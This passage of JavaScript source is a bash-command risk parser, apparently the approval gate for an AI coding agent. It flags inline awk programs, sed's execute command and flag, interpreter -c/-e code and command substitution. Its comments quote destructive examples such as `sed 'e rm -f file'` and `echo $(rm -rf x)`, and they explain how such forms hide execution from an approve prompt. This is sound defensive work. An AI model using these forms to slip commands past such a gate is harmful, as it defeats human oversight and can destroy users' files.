  '-c', // sudo -c context (rare; if hit we still detect interpreter)
  '-D', '--chdir',
  '-r', '--role',
  '-t', '--type',
]);

// Phase 2D follow-up #11: skip env-assignments and command wrappers
// to find the *effective* command token, where "effective" is
// defined by the caller's predicate. Returns the matching token if
// found, or null. Refactored in #14 from the original
// effectiveInterpreterHead to be parameterized by predicate so
// awk/sed/etc. detection can share the same wrapper-skip logic
// without bloating SCRIPT_INTERPRETERS (sed in pipelines is too
// universal to hard-reject).
function findWrappedCommand(tokens, isMatch) {
  // skipPreamble: leading redirects + env-assignments. Without this,
  // `< /tmp/script env awk '...'` would treat `/tmp/script` as the
  // wrapper-or-head candidate and miss the awk inline detection.
  let i = skipPreamble(tokens);
  // Bounded loop guards against pathological wrapper-of-wrapper
  // chains; 16 iterations covers any sane input.
  for (let iter = 0; iter < 16 && i < tokens.length; iter++) {
    const t = tokens[i];
    if (t.kind !== 'word') { i++; continue; }
    const text = t.text;
    const base = tokenBasename(text);
    if (!COMMAND_WRAPPERS.has(base)) {
      // First non-wrapper word — apply predicate
      return isMatch(text) ? t : null;
    }
    // Skip the wrapper token, then its option flags + value-takers
    // + env-style FOO=val (env-specific).
    i++;
    while (i < tokens.length) {
      const u = tokens[i];
      if (u.kind !== 'word') { i++; continue; }
      const a = u.text;
      // `--` is the explicit end-of-options separator
      if (a === '--') { i++; break; }
      // env-style FOO=val (only meaningful for env, but harmless to
      // skip generally)
      if (/^[A-Za-z_][A-Za-z0-9_]*=/.test(a)) { i++; continue; }
      if (a.startsWith('-')) {
        // Long form `--flag=value` — single token, just skip.
        if (a.includes('=')) { i++; continue; }
        // Heuristic: if the flag is in the value-taking set, also
        // skip the next word as its value.
        if (VALUE_TAKING_WRAPPER_FLAGS.has(a)) { i += 2; continue; }
        i++; continue;
      }
      // First positional — that's the wrapped command
      break;
    }
  }
  return null;
}

function effectiveInterpreterHead(tokens) {
  return findWrappedCommand(tokens, text => isScriptInterpreter(text));
}

// Phase 2D follow-up #14 (Codex 🔴, 2026-05-04): awk-family detection.
// `awk 'BEGIN{system("rm x")}'` carries arbitrary code via system() /
// `... | "cmd"` getline / `print | "cmd"`. Same code-execution risk
// as python -c. Distinguished from the awk script-file form
// `awk -f script.awk` (file content is gated separately via fileWrite).
function isAwkBasename(text) {
  return /^(g|m|n)?awk$/.test(tokenBasename(text));
}

// D-fix #3 (2026-05-04): full awk argv semantics in one pass. Returns
// {hasFileFlag, hasInlineFlag, hasPositional} so the caller can decide:
//   - hasInlineFlag → hard-reject (program is in argv via -e / --source)
//   - !hasFileFlag && hasPositional → hard-reject (positional inline program)
//   - else → fall through (file-source / probe / pipe-fed handled separately)
//
// awk's flag set is small but irregular:
//   -F sep / -Fsep                          field separator
//   -v var=val / -vvar=val                  pre-set variable
//   -W ext / -Wext                          gawk extension (e.g. -W exec=PATH)
//   -i inplace / -iinplace                  gawk in-place edit (also handled
//                                           separately as in_place_edit)
//   -f FILE / -fFILE / --file FILE / --file=FILE   program from file
//   -e PROG / -ePROG / --source PROG / --source=PROG   inline program
//   --                                      end of options
//   <positional>                            first non-flag positional is the
//                                           program when no -f/-e seen
function analyzeAwkArgv(argTokens) {
  let hasFileFlag = false;
  let hasInlineFlag = false;
  let hasPositional = false;
  let pastDoubleDash = false;
  for (let i = 0; i < argTokens.length; i++) {
    const t = argTokens[i];
    if (t.kind !== 'word') continue;
    const a = t.text;
    if (pastDoubleDash) {
      // First word after `--` is the program (if no -f/-e seen).
      hasPositional = true;
      break;
    }
    if (a === '--') {
      pastDoubleDash = true;
      continue;
    }
    // File-source flags — program comes from a file (gated by fileRead).
    if (a === '-f' || /^-f.+/.test(a) || a === '--file' || a.startsWith('--file=')) {
      hasFileFlag = true;
      if (a === '-f' || a === '--file') i++; // separate-arg form: skip value
      continue;
    }
    // Inline-source flags — program is in argv (GNU awk -e / --source).
    if (a === '-e' || /^-e.+/.test(a) || a === '--source' || a.startsWith('--source=')) {
      hasInlineFlag = true;
      if (a === '-e' || a === '--source') i++; // separate-arg form: skip value
      continue;
    }
    // Value-taking flags: skip flag + value. Includes GNU awk
    // (gawk) extensions where value is in next token:
    //   -o[file] pretty-print output  | -d[file] debug output
    //   -D[file] debug mode           | -l libname load extension
    //   -L[value] lint mode           | -p[file] profile output
    // D fix #4 (Codex ⚪, 2026-05-04 round 4): pre-fix `awk -o out -f
    // script.awk file` flagged because `-o` wasn't a value-taker —
    // 'out' became hasPositional and shadowed the -f exemption.
    if (a === '-F' || a === '-v' || a === '-W' || a === '-i' ||
        a === '-o' || a === '-d' || a === '-D' ||
        a === '-l' || a === '-L' || a === '-p') {
      i++;
      continue;
    }
    // POSIX-glued value flags.
    if (/^-[FvWidoDlLp]./.test(a)) continue;
    // Other flags (e.g. `--version`, `-V`, `--profile`).
    if (a.startsWith('-')) continue;
    // First non-flag positional = inline program when no -f/-e seen yet.
    hasPositional = true;
    break;
  }
  return { hasFileFlag, hasInlineFlag, hasPositional };
}

// D fix #5 (Codex 🔴 round 5, 2026-05-04): both `awkIsInvocationContext`
// (head-aware + walkback) and `POSITIONAL_VALUE_WRAPPERS` were removed
// after 5 rounds of Codex D proved enumerated wrapper-flag chains never
// get fully covered. The invocation-context filter is gone — any
// awk-family token + inline-form is hard-rejected, regardless of what
// precedes it. See the unified token-scan loop in riskifyTokens for
// rationale + agent-side mitigation (single-quote the awk literal).

// Phase 2D follow-up #14 (Codex 🔴): GNU sed `e` command and the
// `s/.../e` substitute flag both shell-out to execute the result.
// `printf x | sed 'e rm -f file'` deletes file with one approve
// click; `sed 's/x/y/e' file` substitutes then execs the result.
//
// Two detections, in order:
//   - Substitute scan (`s<DELIM>PAT<DELIM>REP<DELIM>FLAGS`): walk
//     the text imperatively to handle ANY delimiter. sed accepts
//     any non-newline non-backslash char as delim (`s,x,y,e` /
//     `s|x|y|e` / `s:x:y:e` / `s#x#y#e` / `s@x@y@e` are all valid).
//     For each substitute found, if FLAGS contains `e` AND ends at
//     a sed boundary (whitespace / `;` / `{` / `}` / newline / EOS)
//     → e-flag bypass. Otherwise mark the substitute region for
//     stripping before pattern 1.
//     Round-14 self-review: originally just `/`-delim regex; round
//     14 known-limit listed `s,x,y,e` / `s|x|y|e` / `s#x#y#e` as
//     uncovered. This commit closes that limit by going imperative
//     (JS regex can't negate a backreference, but a manual scanner
//     trivially handles any delim).
//   - Bare `e CMD`: the standalone sed `e` command accepts ANY
//     sed-address prefix (no address / `2e` / `1,5e` / `/regex/e` /
//     `$e` / `!e` / `~Ne`). After stripping the substitute regions
//     above (so replacement text containing `e<space>` like
//     `s/foo/bar e baz/` doesn't false-positive), match
//     `(?:^|[^a-zA-Z])e\s` — the broad non-letter precedes covers
//     all sed boundary chars uniformly.
function sedExpressionHasEcmd(text) {
  if (typeof text !== 'string' || !text) return false;
  // Walk substitutes; for each: check e flag, otherwise record the
  // region for stripping. `s` must be at command position (start
  // or after non-alphanumeric) to avoid matching `says`/`sass`/etc.
  const substitutes = [];
  let i = 0;
  while (i < text.length) {
    if (text[i] !== 's') { i++; continue; }
    if (i > 0 && /[a-zA-Z0-9]/.test(text[i - 1])) { i++; continue; }
    const delim = text[i + 1];
    if (!delim || /[a-zA-Z0-9\s\\\n]/.test(delim)) { i++; continue; }
    let j = i + 2;
    // PATTERN — escape-aware
    while (j < text.length && text[j] !== delim) {
      j += text[j] === '\\' ? 2 : 1;
    }
    if (j >= text.length) { i++; continue; }
    j++;
    // REPLACEMENT — escape-aware
    while (j < text.length && text[j] !== delim) {
      j += text[j] === '\\' ? 2 : 1;
    }
    if (j >= text.length) { i++; continue; }
    j++;
    // FLAGS — letters only
    let flags = '';
    while (j < text.length && /[a-zA-Z]/.test(text[j])) {
      flags += text[j];
      j++;
    }
    // Boundary check: end-of-string or sed command separator.
    const atBoundary = j >= text.length || /[\s;{}\n]/.test(text[j]);
    if (flags.includes('e') && atBoundary) return true;
    substitutes.push({ start: i, end: j });
    i = j;
  }
  // Build stripped text (replace substitute regions with single
  // space so adjacent chars don't fuse).
  let stripped = '';
  let cursor = 0;
  for (const sub of substitutes) {
    stripped += text.slice(cursor, sub.start) + ' ';
    cursor = sub.end;
  }
  stripped += text.slice(cursor);
  // Bare `e CMD` after start or any non-letter (covers all sed
  // address terminators: `;` / `{` / `}` / `\n` / `/` after regex
  // address / `$` last-line / digit line numbers / `,` range / `!`
  // negation / `~` step).
  return /(?:^|[^a-zA-Z])e\s/.test(stripped);
}

// Phase 2D follow-up #10 (Codex 🔴): script interpreters whose
// `-c` / `-e` / `-r` / `--eval` flag carries inline code that runs
// as arbitrary executable bytes. Same hard-reject treatment as
// nested_shell — the user cannot reliably classify "is this inline
// Python code dangerous?" from a glance at a prompt, and approving
// it bypasses every other gate (file_delete, file_write, etc.).
const SCRIPT_INTERPRETERS = new Set([
  'python', 'python2', 'python3',
  'node', 'nodejs',
  'ruby',
  'perl',
  'php',
  'lua',
  'expect', 'tclsh',
  'groovy',
  'R', 'Rscript',
  'julia',
  'sbcl', 'clisp',
  'iex', 'elixir',
]);
function isScriptInterpreter(text) {
  const base = tokenBasename(text);
  if (SCRIPT_INTERPRETERS.has(base)) return true;
  // python3.11, python2.7 etc.
  if (/^python\d+(\.\d+)?$/.test(base)) return true;
  // lua5.4 etc.
  if (/^lua\d+(\.\d+)?$/.test(base)) return true;
  // Node ./bin/node-x → handled by basename === 'node' already.
  return false;
}

// Phase 2D follow-up #10: flags that carry inline executable code
// across all the interpreters we recognize. Union (some are no-ops
// for some interpreters; that's fine — false-positive cost is rare
// because these flags are uncommon outside their interpreter):
//   -c   python / bash family / sbcl alias
//   -e   ruby / perl / node / lua / R / groovy / julia
//   -E   perl
//   -r   php (run code)
//   -p   node (eval + print) / perl (loop print)
//   --eval     node / julia / sbcl
//   --execute  rare alias
//   --command  expect-style / Rscript-style alias
//   --print    node alias for -p
// Plus POSIX-glued single-letter forms (`-cprint(1)`, `-eputs(1)`).
const INLINE_CODE_FLAG_LITERAL = new Set([
  '-c', '-e', '-E', '-r', '-p',
  '--eval', '--execute', '--command', '--print',
]);
function isInlineCodeFlag(text) {
  if (INLINE_CODE_FLAG_LITERAL.has(text)) return true;
  // POSIX-glued single-letter: `-c<code>` / `-e<code>` / `-E<code>`
  // / `-r<code>` / `-p<code>`.
  if (/^-[ceErp]./.test(text)) return true;
  return false;
}

// Phase 2D follow-up #1 (Codex 🔴): scan a raw command string for
// command substitution / process substitution / backtick subshells.
// These can hide arbitrary commands inside an otherwise-benign top-
// level command (`echo $(rm -rf x)`), which our token-level parser
// can't see into. Quote-aware: skip substrings inside single quotes
// (single-quoted text is literal in bash; $() and `` are NOT
// expanded). Returns true if any substitution construct exists.
function hasShellSubstitution(s) {
  if (typeof s !== 'string' || !s) return false;
  let inSingle = false;
  let inDouble = false;
  let escape = false;
  for (let i = 0; i < s.length; i++) {
    const ch = s[i];
    if (escape) { escape = false; continue; }
    if (ch === '\\' && !inSingle) { escape = true; continue; }
    if (ch === "'" && !inDouble) { inSingle = !inSingle; continue; }
    if (ch === '"' && !inSingle) { inDouble = !inDouble; continue; }
    if (inSingle) continue;  // single quotes suppress substitution
    // $(...) or $((...)) — both can contain executable commands.
    if (ch === '$' && s[i + 1] === '(') return true;
    // <(...) or >(...) process substitution
    if ((ch === '<' || ch === '>') && s[i + 1] === '(') return true;
    // `` `...` `` backtick subshell
    if (ch === '`') return true;
  }
  return false;
}

// Public entry point.
export function parseBashRiskyOps(command) {
  if (typeof command !== 'string' || !command.trim()) {
    return { risks: [], unparseable: false };
  }

  const subs = splitWithSeparators(command);
  const allRisks = [];
  let unparseable = false;

  // Phase 2D follow-up #1: command substitution / backticks / process
  // substitution can hide arbitrary commands inside any sub-command.
  // Detect on the raw command string (quote-aware) since splitCommands
  // tokenizes around &&/||/;/| but doesn't analyze $() / `` payloads.
  if (hasShellSubstitution(command)) {
    allRisks.push({ kind: 'nested_shell', pattern: 'substitution', confidence: 'high' });
  }

  for (const sub of subs) {
    if (hasUnbalancedQuotes(sub.text)) {
      unparseable = true;
      continue;
    }
    let tokens;
    try {
      tokens = tokenize(sub.text);
    } catch {
      unparseable = true;
      continue;
    }
    for (const r of riskifyTokens(tokens, sub.sepBefore)) allRisks.push(r);
  }

  // If we couldn't parse anything but ALSO didn't find any risks, we
  // surface a single 'unknown' so the gate's caller doesn't silently
  // skip the command. CLAUDE.md "无法判断风险 → 默认按高风险处理".
  if (unparseable && allRisks.length === 0) {
    allRisks.push({ kind: 'unknown', pattern: 'unparseable', confidence: 'low' });
  }

  return { risks: allRisks, unparseable };
}
